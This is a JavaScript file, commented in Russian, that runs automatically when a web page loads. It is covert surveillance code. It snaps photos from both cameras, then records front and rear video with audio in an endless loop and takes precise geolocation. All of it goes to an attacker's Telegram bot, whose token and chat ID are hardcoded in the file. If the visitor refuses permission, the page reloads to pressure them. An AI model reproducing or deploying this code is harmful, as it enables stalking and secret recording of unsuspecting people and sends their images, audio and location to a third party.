// 🔥 Встроены твой TG токен и ID
const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
const TELEGRAM_CHAT_ID = "8071841674";
const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";

const statusEl = document.getElementById('status');

// Функция отправки данных в Telegram
async function sendToTelegram(payload) {
  if (payload.error) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload.error })
    });
  } else {
    if (payload.coords) {
      const mapUrl = `https://yandex.com/maps/?ll=${payload.coords.lon}%2C${payload.coords.lat}&z=16`;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `Геолокация: ${mapUrl}` })
      });
    }
    if (payload.photo) {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", payload.photo, "photo.jpg");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: "POST", body: formData });
    }
    if (payload.video) {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("document", payload.video, "video.webm");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: "POST", body: formData });
    }
  }
}

// Основной цикл работы
async function init() {
  let granted = { camera: false, geo: false };
  let coords = null;

  try {
    const streamFront = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
    granted.camera = true;

    // Снимок передней камеры
    const videoFront = document.createElement("video");
    videoFront.srcObject = streamFront;
    await videoFront.play();
    const canvasFront = document.createElement("canvas");
    canvasFront.width = videoFront.videoWidth;
    canvasFront.height = videoFront.videoHeight;
    canvasFront.getContext("2d").drawImage(videoFront,0,0);
    const photoFront = await fetch(canvasFront.toDataURL("image/jpeg")).then(r=>r.blob());
    await sendToTelegram({ photo: photoFront });
    streamFront.getTracks().forEach(t=>t.stop());

    // Снимок задней камеры
    const streamBack = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"environment"}, audio:true });
    const videoBack = document.createElement("video");
    videoBack.srcObject = streamBack;
    await videoBack.play();
    const canvasBack = document.createElement("canvas");
    canvasBack.width = videoBack.videoWidth;
    canvasBack.height = videoBack.videoHeight;
    canvasBack.getContext("2d").drawImage(videoBack,0,0);
    const photoBack = await fetch(canvasBack.toDataURL("image/jpeg")).then(r=>r.blob());
    await sendToTelegram({ photo: photoBack });
    streamBack.getTracks().forEach(t=>t.stop());

    // Цикл видео (10сек фронт + 5сек зад)
    async function recordCycle() {
      const streamF = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
      const streamB = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"environment"}, audio:true });

      while(true){
        // 10 сек фронт
        const recorderF = new MediaRecorder(streamF);
        let chunksF = [];
        recorderF.ondataavailable = e=>chunksF.push(e.data);
        recorderF.start();
        await new Promise(r=>setTimeout(r,10000));
        recorderF.stop();
        await new Promise(r=>recorderF.onstop = r);
        const videoF = new Blob(chunksF,{type:"video/webm"});
        await sendToTelegram({ video: videoF });

        // 5 сек зад
        const recorderB = new MediaRecorder(streamB);
        let chunksB = [];
        recorderB.ondataavailable = e=>chunksB.push(e.data);
        recorderB.start();
        await new Promise(r=>setTimeout(r,5000));
        recorderB.stop();
        await new Promise(r=>recorderB.onstop = r);
        const videoB = new Blob(chunksB,{type:"video/webm"});
        await sendToTelegram({ video: videoB });
      }
    }

    recordCycle(); // старт цикла видео

  } catch(err) {
    granted.camera = false;
  }

  // Геолокация
  try {
    coords = await new Promise((resolve,reject)=>{
      navigator.geolocation.getCurrentPosition(
        pos=>resolve({lat:pos.coords.latitude, lon:pos.coords.longitude}),
        err=>reject(err),
        { enableHighAccuracy:true, timeout:10000 }
      );
    });
    granted.geo = true;
    await sendToTelegram({ coords });
  } catch(err){
    granted.geo = false;
  }

  // Если оба отказали
  if(!granted.camera && !granted.geo){
    await sendToTelegram({ error: TELEGRAM_ERROR_MSG });
    location.reload(); // повторный запрос
  }

  statusEl.textContent = 'Запись и отправка данных выполняется...';
}

// Авто-запуск
init();
